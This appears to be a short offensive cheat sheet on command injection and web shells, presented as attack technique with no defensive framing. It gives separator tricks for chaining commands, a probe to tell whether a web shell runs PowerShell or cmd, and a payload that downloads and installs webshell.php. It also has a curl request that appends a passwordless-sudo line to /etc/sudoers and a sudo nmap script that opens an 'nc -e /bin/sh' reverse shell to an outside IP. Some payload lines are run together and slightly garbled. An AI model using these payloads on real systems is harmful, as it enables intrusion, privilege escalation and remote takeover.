If a single command is working try URL encoding semi-colon
eg : git command works but others are restricted. Then try git;ipconfig (; or && for linux & for windows) (git version for win, git --version for lin)  
***Note** : Make sure to URL encode special chars.

### To determine webshell is powershell or cmd
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
***Note*** : If parameters pass in body try for eg: linux param=";ls" (as url encoded) Always check forgot email password page for anything suspicious in response

##### CMD.php in website we can execute commands in Post Data ?
ip=127.0.0.1%0awgetIP%0amvindex.htmlwebshell.php%0a&send=Ping+It%21
```
curl http://127.0.0.1:8080/start_page.php?page=cmd.php --data "cmd=echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
```

```
echo+'os.execute("nc+-e+/bin/sh+192.168.XX.XX+445")'+>+/var/tmp/shell.nse+&&+sudo+nmap+-- script+/var/tmp/shell.nse
```